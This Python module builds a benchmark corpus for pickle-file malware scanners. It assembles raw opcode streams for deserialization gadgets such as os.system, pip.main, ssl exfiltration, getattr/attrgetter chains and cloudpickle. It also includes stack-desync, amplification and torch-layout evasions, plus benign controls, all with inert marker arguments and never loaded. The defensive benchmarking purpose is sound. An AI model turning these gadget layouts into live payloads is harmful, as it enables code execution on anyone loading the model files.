"""The benchmark corpus: specifications, not payload files.

Nothing in this repository ships a working malicious model file, and that is a
deliberate design constraint rather than an oversight. A git repository full of
ready-to-run pickle RCE payloads is a weapons cache: useful to an attacker who
clones it, hazardous to a contributor who double-clicks one, and likely to be
flagged by the host. So cases are described here as *specifications* and the
bytes are generated into a temporary directory at run time.

Two properties make the generated payloads safe to have on disk:

1. **Inert arguments.** Every payload resolves a genuinely dangerous callable
   (that is the point -- it must exercise the same detection path as a real
   attack) but passes it an argument that does nothing. Commands echo a marker
   string. Hosts and URLs use `.invalid`, the TLD RFC 2606 reserves as
   permanently non-resolvable, so even the DNS-exfiltration cases cannot reach
   a network. A scanner reads the opcode stream and cannot tell the difference;
   a victim who actually loads one prints a marker and exits.

2. **No execution, ever.** Payloads are assembled as raw opcode bytes. This
   module never calls `pickle.loads`, and neither does the runner.

The corpus is only as honest as its provenance, so each case cites where the
technique comes from. Cases invented here, with no published source, are
marked `origin="picklebench"` and should be treated as the weakest evidence in
the set: a benchmark whose author also writes the test cases can accidentally
encode one scanner's detection logic as though it were ground truth.
"""

from __future__ import annotations

import pickle
from dataclasses import dataclass, field
from typing import Callable

# Substituted into every payload argument position. Chosen so that a payload
# which somehow does get unpickled is loud and harmless.
MARKER = "PICKLEBENCH-INERT-MARKER"
# RFC 2606 reserves .invalid as never-resolvable. Using it means the network
# cases are structurally identical to the real gadgets while being incapable of
# contacting anything.
INERT_HOST = "marker.picklebench.invalid"
INERT_URL = f"http://{INERT_HOST}/marker"


def _su(text: str) -> bytes:
    """SHORT_BINUNICODE push. Payload strings are short by construction."""
    raw = text.encode()
    if len(raw) >= 256:
        raise ValueError("payload string too long for SHORT_BINUNICODE")
    return bytes([0x8C, len(raw)]) + raw


def _reduce(module: str, name: str, packed_args: bytes) -> bytes:
    """Protocol-4 stream: STACK_GLOBAL(module, name), args, REDUCE, STOP."""
    return b"\x80\x04" + _su(module) + _su(name) + b"\x93" + packed_args + b"R."


def _tuple1(inner: bytes) -> bytes:
    return inner + b"\x85"


def legacy_torch_layout(payload: bytes) -> bytes:
    """Wrap `payload` in torch's legacy (non-zip) `_legacy_save` layout.

    torch writes a magic number, a protocol version and a sys_info dict as
    three separate pickles before the real object, then raw tensor storage
    after it. A scanner that stops at the first STOP opcode sees only the
    14-byte magic-number pickle.
    """
    return (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
        + pickle.dumps(1001, protocol=2)
        + pickle.dumps({"little_endian": True, "protocol_version": 1001, "type_sizes": {}}, protocol=2)
        + payload
        + b"\x00\x01\x02RAW-TENSOR-STORAGE-PLACEHOLDER\xff"
    )


@dataclass(frozen=True)
class Case:
    """One corpus entry.

    `malicious` is the ground truth a scanner is scored against. `filename`
    matters as much as the bytes: several real-world gaps are extension
    dispatch bugs, so a case that must be named `pytorch_model.bin` says so.
    """

    id: str
    filename: str
    malicious: bool
    technique: str
    origin: str
    build: Callable[[], bytes]
    reference: str = ""
    notes: str = ""
    tags: tuple[str, ...] = field(default_factory=tuple)


# ── Malicious cases ─────────────────────────────────────────────────

MALICIOUS: tuple[Case, ...] = (
    Case(
        id="direct-os-system",
        filename="direct_os_system.pkl",
        malicious=True,
        technique="Direct reference to a canonical dangerous callable.",
        origin="folklore",
        reference="The baseline every pickle scanner has handled since 2018.",
        notes="Control case. A scanner that misses this is broken, not evaded.",
        tags=("baseline",),
        build=lambda: _reduce("os", "system", _tuple1(_su(f"echo {MARKER}"))),
    ),
    Case(
        id="cve-2025-71350-collect-env",
        filename="collect_env_run.pkl",
        malicious=True,
        technique="torch.utils.collect_env.run, a subprocess wrapper reachable "
                  "from inside the torch namespace itself.",
        origin="published-cve",
        reference="CVE-2025-71350",
        tags=("deny-list-bypass", "torch"),
        build=lambda: _reduce(
            "torch.utils.collect_env", "run", _tuple1(_su(f"echo {MARKER} | cat")),
        ),
    ),
    Case(
        id="cve-2025-1716-pip-main",
        filename="pip_main.pkl",
        malicious=True,
        technique="pip.main installs an attacker-controlled package from an "
                  "attacker-controlled index at load time.",
        origin="published-cve",
        reference="CVE-2025-1716",
        tags=("deny-list-bypass", "supply-chain"),
        build=lambda: _reduce(
            "pip", "main",
            _tuple1(
                b"]("
                + _su("install")
                + _su("--index-url")
                + _su(INERT_URL)
                + _su("marker-package")
                + b"e"
            ),
        ),
    ),
    Case(
        id="cve-2025-46417-linecache-read",
        filename="linecache_getline.pkl",
        malicious=True,
        technique="linecache reads an arbitrary file: the first stage of a "
                  "read-then-exfiltrate chain.",
        origin="published-cve",
        reference="CVE-2025-46417",
        notes="File read only. Scanners that rate this below the exfil half "
              "are not necessarily wrong.",
        tags=("deny-list-bypass", "file-read"),
        build=lambda: _reduce("linecache", "getline", _su("/etc/passwd") + b"K\x01\x86"),
    ),
    Case(
        id="cve-2025-46417-ssl-exfil",
        filename="ssl_exfil.pkl",
        malicious=True,
        technique="ssl.get_server_certificate takes a (host, port) pair, so the "
                  "hostname itself is an outbound DNS channel.",
        origin="published-cve",
        reference="CVE-2025-46417",
        tags=("deny-list-bypass", "exfiltration"),
        build=lambda: _reduce(
            "ssl", "get_server_certificate",
            _tuple1(_su(INERT_HOST) + b"M\xbb\x01" + b"\x86"),
        ),
    ),
    Case(
        id="attrgetter-chain",
        filename="operator_attrgetter.pkl",
        malicious=True,
        technique="operator.attrgetter('system') resolves the dangerous "
                  "callable dynamically, so the denied name never appears in "
                  "the opcode stream for a deny list to match.",
        origin="published-technique",
        reference="Standard pickle gadget-chain primitive; see Trail of Bits' "
                  "fickling and the sleepy-pickle write-ups.",
        tags=("deny-list-bypass", "dynamic-resolution"),
        build=lambda: _reduce("operator", "attrgetter", _tuple1(_su("system"))),
    ),
    Case(
        id="getattr-chain",
        filename="builtins_getattr.pkl",
        malicious=True,
        technique="builtins.getattr(module, 'system') -- the same dynamic "
                  "resolution via a different primitive.",
        origin="published-technique",
        reference="Standard pickle gadget-chain primitive.",
        tags=("deny-list-bypass", "dynamic-resolution"),
        build=lambda: (
            b"\x80\x04"
            + _su("builtins") + _su("getattr") + b"\x93"
            + _su("os") + _su("path") + b"\x93"
            + _su("system")
            + b"\x86"
            + b"R."
        ),
    ),
    Case(
        id="cloudpickle-make-function",
        filename="cloudpickle_make_function.pkl",
        malicious=True,
        technique="cloudpickle._make_function rebuilds a live function from a "
                  "marshalled code object.",
        origin="published-technique",
        reference="Carried in picklescan's _unsafe_globals; cloudpickle "
                  "function reconstruction is a long-documented pickle "
                  "code-execution path.",
        notes="The case that argues against pure argument-evidence scoring. "
              "The payload argument is marshalled bytecode, not a command or "
              "a URL, so no argument heuristic can fire on it -- only the "
              "callable's name identifies this one. A scanner whose entire "
              "strategy is 'look at what the call is passed' misses it.",
        tags=("deny-list-only", "code-object"),
        build=lambda: _reduce(
            "cloudpickle.cloudpickle", "_make_function",
            b")",  # EMPTY_TUPLE: no resolvable literal argument at all
        ),
    ),
    Case(
        id="stack-desync-ext1-pop",
        filename="stack_desync.pkl",
        malicious=True,
        technique="EXT1 followed by POP. The real VM pushes the extension-"
                  "registry object and pops it again, leaving the stack "
                  "unchanged. A scanner that simulates the stack but does not "
                  "model EXT1's push pops the callable instead, desyncing "
                  "every opcode that follows.",
        origin="picklebench",
        reference="Found by auditing a scanner's opcode coverage against "
                  "pickletools' 68-opcode table; reported against open-rowan, "
                  "which lost the resolved call before 2026-08. The same "
                  "three-byte shape applies to EXT2/EXT4, PERSID/BINPERSID "
                  "and protocol-5 NEXT_BUFFER.",
        notes="Scores stack-simulation fidelity, not callable recognition. "
              "Scanners that only pattern-match imports are unaffected; ones "
              "that reason about call arguments are exactly the ones at risk, "
              "so this case gets more relevant as scanners get smarter.",
        tags=("parser-coverage", "stack-desync"),
        build=lambda: (
            b"\x80\x04"
            + _su("pip") + _su("main") + b"\x93"
            + b"\x82\x01"   # EXT1, code 1 -- pushes one value
            + b"0"          # POP -- real VM removes it; a naive walk removes the callable
            + _su(INERT_URL)
            + b"\x85"
            + b"R."
        ),
    ),
    Case(
        id="dup-amplification-billion-laughs",
        filename="dup_amplification.pkl",
        malicious=True,
        technique="DUP pushes a second reference to the same object, so "
                  "`DUP TUPLE2` costs two bytes and doubles the node count a "
                  "tree-shaped traversal would walk. Repeated, it is a "
                  "billion-laughs bomb aimed at the scanner rather than the "
                  "loader.",
        origin="published-technique",
        reference="Shipped as billionLaughs.pt with ColdwaterQ's DEFCON 30 "
                  "talk 'Backdooring Pickles: A decade only made things "
                  "worse' (github.com/coldwaterq/pickle_injector).",
        notes="Scores resistance to scanner-directed resource exhaustion, "
              "which is a detection property and not merely a performance "
              "one: a scan that stalls or gets OOM-killed reports nothing. "
              "The payload also carries a real os.system, so a scanner that "
              "survives the amplification should still flag the file. "
              "Amplification is kept modest (2^24 logical nodes from ~70 "
              "bytes) so a vulnerable scanner degrades visibly instead of "
              "hanging the whole run.",
        tags=("resource-exhaustion", "scanner-dos"),
        build=lambda: (
            b"\x80\x04"
            + _su("os") + _su("system") + b"\x93"
            + _su(f"echo {MARKER}") + b"\x85"
            + (b"2" + b"\x86") * 24      # DUP + TUPLE2, 24 rounds
            + b"\x85"
            + b"R."
        ),
    ),
    Case(
        id="getattr-through-opaque-argument",
        filename="getattr_globals_eval.pkl",
        malicious=True,
        technique="getattr(globals(), 'eval'). The first argument is the "
                  "result of another call and so is opaque to any static "
                  "walk, which is what makes this harder than a plain "
                  "attrgetter('eval'): a scanner that requires every argument "
                  "to resolve before it will look at any of them discards the "
                  "'eval' literal entirely.",
        origin="published-technique",
        reference="Marco Slaviero, 'Sour Pickles', BlackHat USA 2011 -- the "
                  "memo-register chaining of getattr/apply/globals. Reported "
                  "against open-rowan as DEF-45.",
        notes="Protocol 0, hand-assembled. The single-argument variant "
              "attrgetter('eval') is a much easier case and most scanners "
              "catch it; this one specifically scores whether partial "
              "argument resolution is handled.",
        tags=("deny-list-bypass", "dynamic-resolution", "partial-resolution"),
        build=lambda: (
            b"c__builtin__\ngetattr\n"
            b"("                          # MARK for getattr's arguments
            b"c__builtin__\nglobals\n"
            b"(t"                         # MARK + TUPLE -> ()
            b"R"                          # globals() -> opaque
            b"S'eval'\n"
            b"t"                          # TUPLE -> (<opaque>, 'eval')
            b"R"                          # getattr(<opaque>, 'eval')
            b"."
        ),
    ),
    Case(
        id="legacy-layout-second-pickle",
        filename="legacy_layout.pt",
        malicious=True,
        technique="os.system placed in the state_dict position of torch's "
                  "legacy multi-pickle save format. A scanner that stops at "
                  "the first STOP opcode inspects a 14-byte magic number and "
                  "declares the file clean.",
        origin="picklebench",
        reference="Found while building this corpus; reported against "
                  "open-rowan, which missed it before 2026-08.",
        notes="Not a deny-list bypass -- the payload is the most obvious "
              "gadget there is. It is a *parser coverage* bypass, which is a "
              "distinct failure mode worth scoring separately.",
        tags=("parser-coverage", "torch-legacy"),
        build=lambda: legacy_torch_layout(
            _reduce("os", "system", _tuple1(_su(f"echo {MARKER}")))
        ),
    ),
    Case(
        id="bin-extension-dispatch",
        filename="pytorch_model.bin",
        malicious=True,
        technique="The same direct os.system payload, named pytorch_model.bin "
                  "-- the most common pickle-bearing filename on HuggingFace.",
        origin="picklebench",
        reference="Found while building this corpus; open-rowan skipped .bin "
                  "on extension before 2026-08.",
        notes="Scores extension dispatch, not opcode analysis. A scanner that "
              "sniffs content passes trivially; one that trusts the extension "
              "never reads the file.",
        tags=("parser-coverage", "extension-dispatch"),
        build=lambda: _reduce("os", "system", _tuple1(_su(f"echo {MARKER}"))),
    ),
)


# ── Benign cases ────────────────────────────────────────────────────
#
# Half the benchmark, and the half a detection-only corpus silently omits. A
# scanner that flags everything scores perfect recall. These are the ordinary
# shapes that a real model file contains and that must stay quiet.

def _benign_state_dict() -> bytes:
    import collections
    return pickle.dumps(
        collections.OrderedDict([("layer.weight", [0.1, 0.2]), ("layer.bias", [0.0])]),
        protocol=4,
    )


def _benign_stdlib_types() -> bytes:
    import datetime
    import decimal
    import fractions
    import uuid
    return pickle.dumps(
        {
            "trained_at": datetime.datetime(2026, 8, 2, 12, 30),
            "lr": decimal.Decimal("0.001"),
            "run_id": uuid.UUID("12345678-1234-5678-1234-567812345678"),
            "ratio": fractions.Fraction(3, 7),
        },
        protocol=4,
    )


def _benign_custom_class() -> bytes:
    # A user's own class: an unrecognized global on nobody's allow list, and
    # the single most common cause of false positives in this whole space.
    return (
        b"\x80\x04"
        + _su("mypackage.models") + _su("TransformerConfig") + b"\x93"
        + b")"      # EMPTY_TUPLE
        + b"\x81"   # NEWOBJ
        + b"."
    )


def _benign_paths_and_urls() -> bytes:
    # Model metadata legitimately contains paths and URLs. Argument-evidence
    # scanners key on exactly these, so this is their hardest negative.
    return pickle.dumps(
        {
            "checkpoint": "/home/user/models/checkpoint-1200.bin",
            "base_model": "https://huggingface.co/gpt2/resolve/main/config.json",
            "cache": "~/.cache/huggingface",
        },
        protocol=4,
    )


BENIGN: tuple[Case, ...] = (
    Case(
        id="benign-state-dict",
        filename="benign_state_dict.pkl",
        malicious=False,
        technique="An ordinary OrderedDict state_dict.",
        origin="picklebench",
        tags=("baseline",),
        build=_benign_state_dict,
    ),
    Case(
        id="benign-stdlib-types",
        filename="benign_stdlib_types.pkl",
        malicious=False,
        technique="datetime, Decimal, UUID and Fraction: unrecognized stdlib "
                  "globals that ordinary pickles construct constantly.",
        origin="picklebench",
        notes="Targets the tempting-but-wrong heuristic 'the stdlib is where "
              "gadgets live, so flag unrecognized stdlib globals'. The stdlib "
              "is also where the ordinary data types live.",
        tags=("false-positive-bait",),
        build=_benign_stdlib_types,
    ),
    Case(
        id="benign-custom-class",
        filename="benign_custom_class.pkl",
        malicious=False,
        technique="A user-defined class, on neither the allow nor the deny "
                  "list, constructed via NEWOBJ.",
        origin="picklebench",
        notes="Targets 'escalate any unknown global that is actually invoked'. "
              "A benign custom class is invoked exactly like a gadget is.",
        tags=("false-positive-bait",),
        build=_benign_custom_class,
    ),
    Case(
        id="benign-paths-and-urls",
        filename="benign_paths_and_urls.pkl",
        malicious=False,
        technique="Filesystem paths and an https URL as ordinary metadata "
                  "strings, not as arguments to a dangerous callable.",
        origin="picklebench",
        notes="Targets naive argument-content matching.",
        tags=("false-positive-bait",),
        build=_benign_paths_and_urls,
    ),
)


def real_model_cases() -> tuple[Case, ...]:
    """Benign cases backed by real, hash-pinned models that have been fetched.

    Empty until `python -m picklebench.realmodels` has run. Skipped rather
    than failed when absent, so the benchmark still works offline -- but a run
    without them is measuring false positives against hand-written pickles
    only, which is much weaker evidence.
    """
    from . import realmodels

    return tuple(
        Case(
            id=model.id,
            filename=model.filename,
            malicious=False,
            technique=f"Real {model.fmt} model from {model.repo}, SHA-256 pinned.",
            origin="real-world",
            reference=f"https://huggingface.co/{model.repo}",
            notes=model.note,
            tags=("real-model", "false-positive-bait"),
            build=lambda m=model: realmodels.cached_path(m).read_bytes(),
        )
        for model in realmodels.cached_models()
    )


ALL_CASES: tuple[Case, ...] = MALICIOUS + BENIGN


def all_cases() -> tuple[Case, ...]:
    """Every case, including real models when they have been fetched."""
    return ALL_CASES + real_model_cases()


def write_corpus(target_dir) -> dict[str, Case]:
    """Materialize every case into `target_dir`. Returns path -> Case."""
    from pathlib import Path

    target = Path(target_dir)
    target.mkdir(parents=True, exist_ok=True)
    written: dict[str, Case] = {}
    for case in all_cases():
        dest = target / case.id / case.filename
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(case.build())
        written[str(dest)] = case
    return written
